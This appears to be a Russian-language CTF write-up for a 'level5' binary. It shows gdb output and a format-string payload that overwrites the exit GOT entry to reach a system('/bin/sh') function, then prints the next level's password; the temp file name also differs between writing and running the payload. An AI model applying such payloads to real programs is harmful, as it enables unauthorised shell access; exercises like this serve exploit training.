@@ -1,0 +1,41 @@
+1. Логинимся level5:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+2. Investigation. Программа копирует нас. Внутри используется fgets, что защиащает против overflow buffer attack, но есть не защищённый print. и есть функция o запускающая system("/bin/sh").
+Так же в конце функии n запускается exit, мы перезапишем адрес exit на функию o.
+
+3. Найдём всё необходимое
+(gdb) p o
+$2 = {<text variable, no debug info>} 0x80484a4 <o>
+
+адрес о - 0x80484a4 в децимал 134513828
+
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+...
+0x080483d0  exit
+0x080483d0  exit@plt
+(gdb) x/i 0x080483d0
+   0x80483d0 <exit@plt>:        jmp    *0x8049838
+
+Адрес функции exit - 0x8049838
+
+
+Найдём где начинает писать наш printf - 4ая позиция
+./level5
+AAAA %p %p %p %p %p %p %p %p
+AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
+
+4. Готовим payload 
+Адрес функции exit + адрес функии o + с четвртой позиции вводим наше число в адрес функции exit
+python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' > /tmp/level5
+
+5. Запускаем
+cat /tmp/l5 /dev/stdin | ./level5
+
+whoami
+level6
+cd ..
+cd level6
+cat .pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
